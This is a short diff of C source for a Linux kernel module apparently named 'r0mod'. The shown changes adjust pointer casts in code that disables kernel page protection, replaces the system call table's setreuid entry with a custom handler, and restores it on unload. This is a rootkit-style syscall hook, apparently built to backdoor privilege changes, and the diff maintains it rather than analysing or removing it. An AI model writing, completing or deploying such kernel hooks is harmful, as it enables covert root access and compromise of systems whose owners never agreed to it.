@@ -78,7 +78,7 @@ static int __init r0mod_init(void)
     disable_page_protection();
     {
         orig_setreuid = (void *)sct[__NR_setreuid];
-        sct[__NR_setreuid] = (unsigned long**)new_setreuid;
+        sct[__NR_setreuid] = (unsigned long*)new_setreuid;
     }
     enable_page_protection();
 
@@ -93,7 +93,7 @@ static void __exit r0mod_exit(void)
     {
         disable_page_protection();
         {
-            sct[__NR_setreuid] = (unsigned long**)orig_setreuid;
+            sct[__NR_setreuid] = (unsigned long*)orig_setreuid;
         }
         enable_page_protection();
     }
